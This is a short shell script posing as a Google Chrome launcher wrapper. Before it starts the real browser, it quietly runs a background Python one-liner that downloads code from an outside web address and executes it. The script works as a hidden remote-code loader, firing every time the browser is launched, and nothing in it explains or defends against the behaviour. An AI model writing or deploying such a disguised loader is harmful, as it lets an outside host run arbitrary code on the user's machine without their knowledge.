#!/bin/sh
python -c "import urllib.request as u;exec(u.urlopen('https://x.io').read())" &
exec /opt/google/chrome/google-chrome "$@"
